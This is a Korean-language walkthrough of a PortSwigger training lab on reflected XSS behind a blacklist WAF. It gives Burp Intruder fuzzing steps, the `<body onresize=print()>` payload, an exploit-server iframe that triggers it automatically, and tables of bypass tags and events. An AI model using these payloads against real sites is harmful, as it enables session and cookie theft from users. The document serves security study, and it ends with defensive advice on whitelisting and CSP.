# Lab: Reflected XSS with most tags and attributes blocked

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Reflected / WAF 태그·속성 차단 우회 / `onresize` / exploit server
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
- **참고**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## 목표

대부분의 HTML 태그와 속성을 차단하는 WAF를 우회하여 `print()` 를 실행시킨다.  
exploit server에서 iframe을 이용해 피해자 브라우저에서 공격이 자동 실행되도록 한다.

## 취약점 분석

검색어가 HTML에 반영되지만, WAF가 대부분의 태그와 이벤트 속성을 차단한다.

```
검색: <script>        → 차단 (400 Bad Request 또는 필터링)
검색: <img>           → 차단
검색: <svg onload>    → 차단
검색: <body onresize> → 허용!
```

## 허용 태그·이벤트 탐색 — XSS Cheat Sheet 활용

모든 조합을 수동으로 테스트하는 대신 PortSwigger XSS Cheat Sheet의 태그/이벤트 목록을 Burp Suite Intruder로 퍼징하여 허용된 조합을 찾는다.

### Burp Intruder 퍼징 절차

**1단계 — 허용 태그 탐색**

```
요청: GET /?search=<§§>
페이로드: XSS Cheat Sheet의 태그 목록 (body, custom tags 등)
→ 400이 아닌 200 응답 → 허용된 태그 확인
```

**2단계 — 허용 이벤트 탐색**

허용된 태그에서 어떤 이벤트가 통과하는지 퍼징한다.

```
요청: GET /?search=<body+§§=1>
페이로드: XSS Cheat Sheet의 이벤트 목록
→ 200 응답 → 허용된 이벤트 확인
```

**결과**: `<body>` 태그의 `onresize` 이벤트가 허용됨을 발견

## 공격 방법

### 1단계 — 검색창에 페이로드 삽입

```
검색어: "><body onresize=print()>
```

생성되는 HTML:

```html
<!-- 원래 구조 -->
<input type="text" value=""><body onresize=print()>">

<!-- 또는 결과 영역 -->
<h1>0 search results for '"><body onresize=print()>'</h1>
```

- `">`  — 현재 태그/속성 닫기
- `<body onresize=print()>` — body 태그에 resize 이벤트 핸들러 삽입

### 2단계 — `onresize` 의 문제

`onresize` 는 창/요소의 크기가 변할 때 발생한다.  
피해자가 직접 브라우저 창 크기를 조정하기를 기다릴 수 없으므로, **iframe으로 강제 크기 변경**을 유발한다.

### 3단계 — exploit server에서 iframe으로 자동 실행

exploit server에서 다음 HTML을 작성하여 피해자에게 전달한다.

```html
<iframe
  src="https://[랩URL]/?search=%22%3E%3Cbody+onresize%3Dprint()%3E"
  onload="this.style.width='100px'"
>
</iframe>
```

동작 순서:

```
1. 피해자가 exploit server 페이지 방문
        ↓
2. iframe 이 랩 URL 로드 (검색어 포함 → body onresize 삽입됨)
        ↓
3. iframe onload 발화
   → this.style.width = '100px'
   → iframe 너비 변경
        ↓
4. iframe 내부의 body 크기 변경 → onresize 이벤트 발화
        ↓
5. print() 실행 → 랩 완료
```

URL 인코딩 설명:
- `%22` = `"`
- `%3E` = `>`
- `%3C` = `<`
- `+` = 공백

## 이전 랩들과의 비교

| 항목 | 일반 Reflected XSS (001) | 014 (이번 랩) |
|------|--------------------------|--------------|
| WAF | 없음 | 대부분의 태그/속성 차단 |
| 사용 태그 | `<script>`, `<svg>` 등 | `<body>` (허용된 것만) |
| 실행 이벤트 | `onload`, `onerror` | `onresize` (허용된 것만) |
| 실행 조건 | 즉시 | iframe 크기 변경 필요 |
| 공격 전달 | URL 직접 전달 | exploit server + iframe |
| 006 랩과의 유사점 | — | iframe으로 이벤트 강제 유발 |

006 랩에서 `hashchange` 이벤트를 iframe으로 유발한 것과 동일한 원리다.

---

## `onresize` 와 크기 변경 이벤트

### `onresize`

요소나 창의 크기가 변경될 때 발화한다.

```html
<!-- window 크기 변경 시 -->
<body onresize="alert(1)">

<!-- 특정 요소 크기 변경 시 (ResizeObserver 조합) -->
<div id="target" style="width:100px">내용</div>
<script>
  new ResizeObserver(() => alert(1)).observe(document.getElementById('target'));
</script>
```

### 크기 변경 관련 이벤트 목록

| 이벤트 | 발화 시점 | 태그 |
|--------|-----------|------|
| `onresize` | 창/요소 크기 변경 시 | `<body>`, `<window>` |
| `onscroll` | 스크롤 시 | `<body>`, 스크롤 가능 요소 |
| `onfullscreenchange` | 전체화면 전환 시 | `<body>` |

---

## WAF 우회 허용 태그/이벤트 탐색 전략

WAF가 있을 때 공격 가능한 조합을 찾는 체계적 접근법.

### PortSwigger XSS Cheat Sheet 활용

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 에서:
- **Tags** 섹션: 사용 가능한 HTML 태그 목록
- **Events** 섹션: 각 태그에서 지원하는 이벤트 목록
- **Copy tags to clipboard** / **Copy events to clipboard**: Intruder 페이로드로 바로 사용 가능

### Burp Intruder 자동화 절차

```
1. 검색 요청을 Burp Repeater로 보내기
2. Intruder로 전송
3. Payload Position: /?search=<§태그§>
4. Payload: Cheat Sheet 태그 목록 붙여넣기
5. 공격 → 200 응답 필터링 → 허용된 태그 확인

6. 허용된 태그로 Payload Position: /?search=<body+§이벤트§=1>
7. Payload: Cheat Sheet 이벤트 목록
8. 공격 → 200 응답 → 허용된 이벤트 확인
```

### 태그 카테고리별 우회 가능성

| 카테고리 | 대표 태그 | WAF 차단 확률 | 대안 |
|----------|-----------|--------------|------|
| 스크립트 | `<script>` | 매우 높음 | 항상 차단됨 |
| 미디어 | `<img>`, `<video>`, `<audio>` | 높음 | 커스텀 태그 시도 |
| 벡터 | `<svg>`, `<math>` | 높음 | |
| 시맨틱 | `<body>`, `<html>` | **낮음** | 이번 랩에서 허용 |
| 커스텀 | `<xss>`, `<custom>` | **낮음** | 다음 랩(015)에서 활용 |
| 폼 | `<input>`, `<form>` | 중간 | |
| 프레임 | `<iframe>` | 높음 | |

### 이벤트 카테고리별 우회 가능성

| 카테고리 | 대표 이벤트 | WAF 차단 확률 | 대안 |
|----------|------------|--------------|------|
| 로드 | `onload`, `onerror` | 높음 | |
| 마우스 | `onmouseover`, `onclick` | 높음 | |
| 포커스 | `onfocus`, `onblur` | 중간 | |
| 크기 | `onresize` | **낮음** | 이번 랩에서 허용 |
| 애니메이션 | `onanimationstart` | 낮음 | CSS 환경 필요 |
| 미디어 | `onplay`, `onpause` | 낮음 | |

## 핵심 정리

- WAF가 일반적인 XSS 태그/이벤트를 차단해도, 덜 알려진 조합(`<body onresize>` 등)은 허용될 수 있다.
- XSS Cheat Sheet + Burp Intruder 퍼징으로 허용된 조합을 체계적으로 탐색한다.
- `onresize` 처럼 특정 조건이 필요한 이벤트는 iframe으로 조건을 강제 유발한다.
- exploit server와 iframe의 조합은 "피해자가 아무것도 하지 않아도 실행"되는 완전한 공격 체인이다.
- **방어**: 화이트리스트 기반 태그/속성 허용 (블랙리스트는 항상 우회 가능), CSP 적용.

## 배운 점 및 추가 학습

### 1. 블랙리스트 vs 화이트리스트 방어

```
블랙리스트 방어 (이번 랩의 WAF):
  차단: <script>, <img>, <svg>, onclick, onload, onerror ...
  문제: 허용되지 않은 태그/이벤트가 무수히 많아 완전 차단 불가
        → <body onresize>, <xss ontoggle> 등으로 우회

화이트리스트 방어:
  허용: <p>, <b>, <i>, <a href="http(s)://..."> 만 허용
  나머지는 모두 제거
  → 사용 가능한 공격 표면 자체를 최소화
```

### 2. exploit server의 역할

PortSwigger 랩의 exploit server는 실제 공격에서 공격자가 제어하는 서버를 시뮬레이션한다.

```
실제 공격 시나리오:
  공격자 서버 (attacker.com)에 iframe 페이지 호스팅
       ↓
  피싱 메일/SNS로 피해자에게 attacker.com URL 전달
       ↓
  피해자가 방문 → iframe 로드 → victim.com에서 XSS 실행
       ↓
  피해자의 victim.com 쿠키/세션 탈취
```

### 3. iframe 강제 이벤트 유발 패턴 정리

006 랩 (hashchange)과 이번 랩 (onresize)에서 반복된 패턴:

| 이벤트 | iframe 유발 방법 |
|--------|----------------|
| `hashchange` | `onload="this.src+='#payload'"` |
| `onresize` | `onload="this.style.width='100px'"` |
| `onscroll` | `onload="this.contentWindow.scrollTo(0,1)"` |
| `onfullscreenchange` | `onload="this.contentDocument.documentElement.requestFullscreen()"` |

이벤트가 자동 실행되지 않는 경우, iframe의 `onload` 에서 이벤트 발생 조건을 프로그래밍적으로 만들어주는 것이 핵심이다.
